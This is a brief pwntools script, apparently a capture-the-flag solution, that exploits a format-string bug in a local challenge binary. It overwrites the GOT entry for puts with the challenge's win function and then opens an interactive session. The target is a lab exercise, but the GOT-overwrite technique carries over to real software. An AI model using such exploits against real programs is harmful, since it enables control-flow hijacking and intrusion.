# coding: utf-8
from pwn import *
p = process("./chall_11")
elf = ELF("./chall_11")
payload = fmtstr_payload(7, {elf.got.puts: elf.sym.win})
p.recv()
p.sendline(payload)
p.interactive()
